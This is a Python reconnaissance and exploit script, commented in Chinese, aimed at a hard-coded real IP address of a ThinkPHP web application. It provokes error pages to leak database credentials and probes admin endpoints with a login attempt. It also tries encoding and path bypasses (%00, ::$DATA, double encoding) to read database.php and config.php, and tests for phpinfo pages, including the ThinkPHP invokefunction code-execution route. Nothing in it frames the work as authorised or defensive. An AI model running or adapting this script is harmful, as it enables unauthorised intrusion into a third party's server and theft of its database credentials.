#!/usr/bin/env python3
"""tp_db_config.py - 泄露数据库配置(找database.php内容)
思路: 触发"数据库连接错误"或"配置加载"错误, 错误页会显示配置数组
"""
import urllib.request, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'https://139.196.199.221'

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(300000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read(300000).decode('utf-8', 'ignore')
    except Exception:
        return 0, ''

def post(url, data):
    import urllib.parse
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
            headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded'}), timeout=8, context=ctx)
        return r.status, r.read(300000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read(300000).decode('utf-8', 'ignore')
    except Exception:
        return 0, ''

def find_db_config(b):
    """在错误页找数据库配置痕迹"""
    hits = []
    for pat in [r"'database'\s*=>\s*'[^']*'", r"'hostname'\s*=>\s*'[^']*'",
                r"'username'\s*=>\s*'[^']*'", r"'password'\s*=>\s*'[^']*'",
                r"'hostport'\s*=>\s*'?[^',]*", r"mysql:host=[^;'\"]*",
                r"connect[^<]{0,60}(?:fail|error|denied)[^<]{0,60}"]:
        for m in re.finditer(pat, b, re.I):
            hits.append(m.group(0))
    return hits

print("=== 1. 触发DB连接错误 ===", flush=True)
# 尝试各种能触达数据库的操作
triggers = [
    ('GET', '/admin/export/goodslist.html?num=5&page=1&status=1'),
    ('POST', '/admin/order/getList.html', {'page': '1', 'limit': '10'}),
    ('POST', '/admin/goods/getList.html', {'page': '1', 'limit': '10'}),
    ('GET', '/admin/system/index.html'),
    ('POST', '/admin/login/login.html', {'name': 'admin', 'pwd': 'x'}),
    ('GET', '/admin/goodsguige/getList.html?num=5'),
    ('GET', '/admin/brand/getSelect.html'),
    ('GET', '/admin/goods/getList.html?num=5'),
]
for t in triggers:
    if t[0] == 'GET':
        st, b = get(BASE + t[1])
    else:
        st, b = post(BASE + t[1], t[2])
    cfg = find_db_config(b)
    if cfg:
        print('%s: DB-CONFIG LEAK: %s' % (t[1], cfg[:5]), flush=True)
    m = re.search(r'<h1>([^<]{0,80})</h1>', b)
    title = m.group(1) if m else '?'
    print('  %s -> st=%d size=%d err=%s' % (t[1][:50], st, len(b), title), flush=True)

print("\n=== 2. 尝试读database.php(多种方式) ===", flush=True)
for p in ['/application/database.php', '/application/database.php/', '/application/database.php/.',
          '/application/database.php%2e', '/application/database.php%00.txt',
          '/application/database.php%3F1', '/application/database.php%252e',
          '/application/config.php', '/application/config.php/',
          '/application/extra/database.php', '/application/extra/config.php',
          '/application/database.php?1', '/application/database.php#1',
          '/%61pplication/database.php', '/application//database.php',
          '/application/database.php::$DATA', '/application/database.php%3a%3a%24DATA']:
    st, b = get(BASE + p)
    if st == 200 and len(b) > 100:
        print('  %s -> st=200 size=%d BODY: %s' % (p, len(b), b[:200].replace(chr(10), ' ')), flush=True)
    elif st == 200:
        print('  %s -> st=200 size=%d (empty)' % (p, len(b)), flush=True)

print("\n=== 3. 找phpinfo/探针 ===", flush=True)
for p in ['/phpinfo.php', '/info.php', '/test.php', '/phpinfo.php5', '/i.php',
          '/admin/phpinfo.php', '/index.php?s=index/think\\app/invokefunction&function=phpinfo']:
    st, b = get(BASE + p)
    if 'phpinfo' in b.lower() or 'PHP Version' in b:
        print('  %s -> PHPINFO FOUND!' % p, flush=True)
    else:
        print('  %s -> st=%d size=%d' % (p, st, len(b)), flush=True)
print("=== DONE ===", flush=True)
